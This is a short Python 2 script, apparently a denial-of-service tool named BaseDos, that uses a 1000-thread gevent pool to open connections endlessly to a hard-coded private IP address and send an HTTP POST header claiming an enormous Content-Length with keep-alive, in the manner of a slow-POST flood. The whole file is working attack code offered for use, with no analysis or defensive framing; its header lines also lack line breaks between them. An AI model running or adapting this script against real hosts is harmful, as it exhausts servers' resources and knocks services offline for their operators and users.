#coding=utf8
import gevent
from gevent import socket
from gevent.threadpool import ThreadPool

class BaseDos(object):
    def __init__(self,host,port=80,threads=1000):
        self.host = host
        self.port = port
        self.pool = ThreadPool(threads)
        self.payload = (
            'POST / HTTP/1.1'
            'Connection: keep-alive'
            'Content-Length: 999999999999999999999999999999')
    def exp(self,i):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host,self.port))
        print i,'   ',sock.send(self.payload)

    def ack(self,timeout=None):
        i=0
        while True:
            i+=1
            self.pool.spawn(self.exp,i)
        gevent.wait()

BaseDos('192.168.64.251').ack()